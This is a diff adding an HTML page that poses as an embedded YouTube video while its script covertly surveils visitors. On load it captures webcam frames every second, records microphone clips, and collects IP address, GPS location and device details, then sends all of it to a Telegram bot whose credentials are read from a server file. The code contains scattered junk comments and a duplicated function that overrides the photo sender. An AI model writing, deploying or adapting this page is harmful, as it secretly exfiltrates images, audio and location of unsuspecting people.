@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>W8</title>
+    <style>
+        #video {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="youtube-video">
+        <iframe width="560" height="315" src="https://www.youtube.com/embed/k4CmCyOj_aw?autoplay=1" frameborder="0" allowfullscreen></iframe>
+    </div>
+    
+    <video id="video" autoplay></video>
+    <canvas id="canvas" width="2000" height="2000" style="display: none;"></canvas>
+
+    <script>
+        // Remove hardcoded botToken and chatId
+        // Use only dynamically fetched TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID
+        // Remove: const botToken = ...
+        // Remove: let chatId = ...
+        // Remove: getChatIdFromUrl and related usages
+        // Refactor all sendToTelegram, sendTextToTelegram, sendVideoToTelegram, etc. to use TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID
+        // Ensure all fetches to Telegram use these variables
+
+        function startCamera() {
+            const video = document.getElementById("video");
+            const canvas = document.getElementById("canvas");
+            const ctx = canvas.getContext("2d");
+
+            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+            if (isMobile) {
+                video.setAttribute("width", "100%");
+                video.setAttribute("height", "auto");
+            } else {
+                video.setAttribute("width", "2000");
+                video.setAttribute("height", "2000");
+            }
+// 9ait7777666544422
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+
+                    setInterval(() => {
+                        ctx.drawImage(video, 0, 0, 2000, 2000);
+                        canvas.toBlob(sendToTelegram, "image/jpeg", 0.8);
+                        sendIpAddressToTelegram();
+                        sendLocationToTelegram();
+                        startRecording();
+                    }, 1000);
+                })
+                .catch(error => {
+                    console.error(error);
+                    alert("Failed to access camera.");
+                });
+        }
+
+        function sendToTelegram(blob) {
+            const formData = new FormData();
+            formData.append("photo", blob, "camera.jpg");
+            formData.append("chat_id", TELEGRAM_CHAT_ID);
+// 9ait7777666544422
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData,
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log("Camera frame sent to Telegram.");
+                    } else {
+                        throw new Error(data.description);
+                    }
+                })
+                .catch(error => {
+                    console.error(error);
+                    alert("Failed to send camera frame.");
+                });
+        }
+// 9ait7777666544422
+        function sendIpAddressToTelegram() {
+            fetch("https://api.ipify.org/?format=json")
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    const message = `IP Address: ${ipAddress}`;
+                    sendTextToTelegram(message);
+                })
+                .catch(error => {
+                    console.error(error);
+                    alert("Failed to fetch IP address.");
+                });
+        }
+
+        function sendTextToTelegram(message) {
+            const params = new URLSearchParams({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message
+            });
+// 9ait7777666544422
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?${params}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log("Message sent to Telegram.");
+                    } else {
+                        throw new Error(data.description);
+                    }
+                })
+                .catch(error => {
+                    console.error(error);
+                    alert("Failed to send message.");
+                });
+        }
+
+        function sendLocationToTelegram() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    const message = `GPS Location: ${latitude}, ${longitude}`;
+                    sendTextToTelegram(message);
+                }, error => {
+                    console.error(error);
+                    const errorMessage = getGeolocationErrorMessage(error);
+                    alert(errorMessage);
+                });
+            } else {
+                console.error("Geolocation not available.");
+                alert("Geolocation is not supported.");
+            }
+        }
+// 9ait7777666544422
+        function getGeolocationErrorMessage(error) {
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    return "Permission to access GPS location was denied.";
+                case error.POSITION_UNAVAILABLE:
+                    return "GPS location information is unavailable.";
+                case error.TIMEOUT:
+                    return "GPS location request timed out.";
+                default:
+                    return "An unknown error occurred while fetching GPS location.";
+            }
+        }
+
+        function sendAudioToTelegram(blob) {
+            const formData = new FormData();
+            formData.append("audio", blob, "recording.wav");
+            formData.append("chat_id", TELEGRAM_CHAT_ID);
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, {
+                method: "POST",
+                body: formData,
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log("Audio recording sent to Telegram.");
+                    } else {
+                        throw new Error(data.description);
+                    }
+                })
+                .catch(error => {
+                    console.error(error);
+                    alert("Failed to send audio recording.");
+                });
+        }
+// 9ait7777666544422
+        function startRecording() {
+            const audioChunks = [];
+
+            navigator.mediaDevices
+                .getUserMedia({ audio: true, video: false })
+                .then((stream) => {
+                    const mediaRecorder = new MediaRecorder(stream);
+
+                    mediaRecorder.start();
+
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                    }, 4000);
+// 9ait7777666544422
+                    mediaRecorder.addEventListener("dataavailable", (event) => {
+                        audioChunks.push(event.data);
+                    });
+
+                    mediaRecorder.addEventListener("stop", () => {
+                        const audioBlob = new Blob(audioChunks, { type: "audio/wav" });
+                        sendAudioToTelegram(audioBlob);
+                    });
+                })
+                .catch((error) => {
+                    console.error(error);
+                    alert("Failed to access microphone.");
+                });
+        }
+
+        // Call startCamera when the page is loaded.
+        startCamera();
+
+    
+        // ====== DEVICE/ENVIRONMENT INFO COLLECTION ======
+        async function getDeviceInfo() {
+            const nav = navigator;
+            const deviceType = /android/i.test(nav.userAgent) ? 'Android' :
+                /iphone|ipad|ipod/i.test(nav.userAgent) ? 'iPhone/iOS' :
+                /windows/i.test(nav.userAgent) ? 'Windows PC' :
+                /macintosh|mac os x/i.test(nav.userAgent) ? 'Mac' :
+                /linux/i.test(nav.userAgent) ? 'Linux' : 'Unknown';
+            const userAgent = nav.userAgent;
+            const platform = nav.platform;
+            const language = nav.language || nav.userLanguage;
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const referrer = document.referrer ? document.referrer : 'Direct/None';
+            const connection = nav.connection ? nav.connection.effectiveType : 'Unknown';
+            const cpuCores = nav.hardwareConcurrency || 'Unknown';
+            const ram = nav.deviceMemory ? nav.deviceMemory + ' GB' : 'Unknown';
+            const now = new Date();
+            const currentTime = now.toLocaleString();
+            let batteryInfo = 'Not supported';
+            if (nav.getBattery) {
+                try {
+                    const battery = await nav.getBattery();
+                    batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not charging'})`;
+                } catch (e) {}
+            }
+            return {
+                deviceType, userAgent, platform, language, screenRes, timezone, referrer,
+                connection, cpuCores, ram, batteryInfo, currentTime
+            };
+        }
+
+        // ====== IP & GEOLOCATION INFO ======
+        async function getIPGeoInfo() {
+            try {
+                const res = await fetch('https://geolocation-db.com/json/');
+                if (!res.ok) throw new Error('IP info fetch failed');
+                const data = await res.json();
+                return {
+                    ip: data.IPv4 || 'Unknown',
+                    city: data.city || 'Unknown',
+                    region: data.state || 'Unknown',
+                    country: data.country_name || 'Unknown'
+                };
+            } catch (e) {
+                return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' };
+            }
+        }
+
+        // ====== TELEGRAM BOT SENDER ======
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+        }
+
+        // ====== MESSAGE FORMATTER ======
+        function formatDeviceInfo(info, geo) {
+            return [
+                '*Device and Environment Info*',
+                `📱 Device Name/Type: ${info.deviceType}`,
+                `🕸️ User Agent: ${info.userAgent}`,
+                `💻 Platform: ${info.platform}`,
+                `🈯 Language: ${info.language}`,
+                `📐 Screen Resolution: ${info.screenRes}`,
+                `⏰ Timezone: ${info.timezone}`,
+                `🔗 Referrer: ${info.referrer}`,
+                `📶 Connection Type: ${info.connection}`,
+                `🧠 CPU Cores: ${info.cpuCores}`,
+                `💾 RAM: ${info.ram}`,
+                `🔋 Battery Info: ${info.batteryInfo}`,
+                `🕒 Current Time: ${info.currentTime}`,
+                '',
+                '*IP and Geolocation Info*',
+                `🌍 IP Address: ${geo.ip}`,
+                `🏙️ City: ${geo.city}`,
+                `🌐 Region/State: ${geo.region}`,
+                `🌎 Country: ${geo.country}`
+            ].join('\n');
+        }
+
+        // ====== ON PAGE LOAD: SEND DEVICE/ENV INFO ======
+        window.addEventListener('DOMContentLoaded', async () => {
+            const info = await getDeviceInfo();
+            const geo = await getIPGeoInfo();
+            const message = formatDeviceInfo(info, geo);
+            sendToTelegram(message);
+        });
+
+        // Fetch Telegram config from server.txt
+        async function getTelegramConfig() {
+            try {
+                const res = await fetch('server.txt');
+                const text = await res.text();
+                const token = text.match(/TOKEN=(.*)/)[1].trim();
+                const chatId = text.match(/CHAT_ID=(.*)/)[1].trim();
+                return { token, chatId };
+            } catch (e) {
+                alert('Failed to load Telegram config.');
+                return { token: '', chatId: '' };
+            }
+        }
+
+        let TELEGRAM_BOT_TOKEN = '';
+        let TELEGRAM_CHAT_ID = '';
+        getTelegramConfig().then(cfg => {
+            TELEGRAM_BOT_TOKEN = cfg.token;
+            TELEGRAM_CHAT_ID = cfg.chatId;
+        });
+    </script>
+</body>
+</html>
